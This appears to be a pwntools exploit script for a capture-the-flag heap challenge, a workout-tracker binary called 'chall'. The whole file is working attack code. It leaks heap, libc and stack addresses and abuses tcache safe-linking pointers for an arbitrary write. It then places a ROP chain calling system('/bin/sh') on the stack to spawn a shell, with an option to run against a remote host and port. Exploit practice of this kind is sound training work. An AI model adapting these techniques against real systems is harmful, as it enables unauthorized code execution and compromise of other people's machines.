#!/usr/bin/env python
from pwn import *
from time import sleep
from os import getcwd

context.binary = e = ELF("./chall")
libc = e.libc

gs = f"""
cd {getcwd()}
dir ..

list main
# b 98
# b 105
# b 115
b 116

# b free
"""


def start():

    if args.LOCAL:
        p = process(e.path)

    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


def GDB(io: process):
    if args.GDB and args.LOCAL:
        sleep(1)
        gdb.attach(io, gdbscript=gs)
        pause()


def add(name: bytes, dest: bytes):
    io.sendlineafter(b'Choose an option: \n', b'1')
    io.sendafter(b"What's the name of your exercise? \n", name)
    io.sendafter(b"what is the description of your exercise? \n", dest)


def workout(exercises: list[tuple[bytes, int]]) -> int:
    num = len(exercises)
    io.sendlineafter(b'Choose an option: \n', b'2')
    io.sendlineafter(
        b'How many exercises should your workout have? \n', str(num).encode())

    for exercise in exercises:
        io.sendafter(b"Enter the name of the exercise: ", exercise[0])
        io.sendlineafter(
            b"How many times should your exercise be repeated? ", str(exercise[1]).encode())

    io.recvuntil(b'our workout has id ')
    return int(io.recvline().decode())


def workoutid(id: int):
    io.sendlineafter(b'Choose an option: \n', b'3')
    io.sendlineafter(b"what's the id of your workout? ",
                     str(id).encode())


def edit(name: bytes, dest: bytes):
    io.sendlineafter(b'Choose an option: \n', b'4')
    io.sendafter(
        b'Enter the name of the exercise you want to edit: \n', name)
    io.sendafter(b'Enter the new description: \n', dest)


while 1:
    io = start()

    add(b'A'*0x10, b'X'*10)
    add(b'B'*0x10, b'hehe')

    workout([(b'A'*0x10, 0)])  # workout 0
    add(b'A'*0x10, b'Y'*0x10)

    workout([(b'A'*0x10, 1), (b'B'*0x10, 1),
            (b'B'*0x10, 1), (b'B'*0x10, 1)])  # workout 1

    add(b'C'*0x80, b'X'*10)
    add(b'D'*0x10, b'hehe')

    workout([(b'C'*0x80, 0)])  # workout 2

    add(b'C'*0x80, b'X'*10)

    for i in range(0x50+0x120):
        workoutid(0)

    workoutid(1)
    io.recvuntil(b'] - [')
    buf = io.recvuntil(b', 0').decode().split(',')
    buf.reverse()

    heap = 0
    for c in buf:
        heap += int(c)
        heap *= 0x100

    heap = (heap << 4) - 0x2000

    log.info(hex(heap))

    add(b'leaker', p64(1)*2+p64(8)+p64(heap+0x308)+p64(8)*2+p64(heap+0x308)+p64(8))

    workoutid(1)
    io.recvuntil(b'] - [')
    buf = io.recvuntil(b', 0').decode().split(',')
    buf.reverse()

    _IO_2_1_stderr_ = 0
    for c in buf:
        _IO_2_1_stderr_ += int(c)
        _IO_2_1_stderr_ *= 0x100

    _IO_2_1_stderr_ = _IO_2_1_stderr_ >> 8
    libc.address = _IO_2_1_stderr_ - libc.sym['_IO_2_1_stderr_']
    log.info(hex(libc.address))

    edit(b'leaker', p64(1)+p64(0)+p64(8) +
         p64(libc.sym.environ)+p64(8)*2+p64(libc.sym.environ)+p64(8))

    workoutid(1)
    io.recvuntil(b'] - [')
    buf = io.recvuntil(b', 0').decode().split(',')
    buf.reverse()

    stack = 0
    for c in buf:
        stack += int(c)
        stack *= 0x100

    stack = stack >> 8
    log.info(hex(stack))

    add(b'X'*0x30, b'T'*0x40)
    add(b'Y'*0x30, b'G'*0x40)

    _ = workout([(b'X'*0x30, 0)])

    add(b'X'*0x30, b'T'*0x80)

    target = heap+0x35f0
    target1 = heap+0x3560

    current_fd = target1 ^ (target >> 12)
    want_fd = (heap + 0x3680) ^ (target >> 12)

    if not (want_fd > current_fd):
        io.close()
        continue
    else:
        break


GDB(io)

for i in range(want_fd - current_fd):
    workoutid(_)

add(b'rop', b'_'*0x40)

edit(b'Y'*0x30,
     (
         p64(1) +
         p64(1) +
         p64(3) +
         p64(heap+0x3880) +
         p64(3) +
         p64(0x40) +
         p64(stack - 0xaf0) +
         p64(0x40)
     ).ljust(0x40, b'\0')
     )

edit(b'rop', (
    p64(libc.address+0x000000000002a3e5) +
    p64(next(libc.search(b'/bin/sh'))) +
    p64(libc.address+0x000000000002a3e6) +
    p64(libc.sym.system)
).ljust(0x40, b'\0'))


io.interactive()
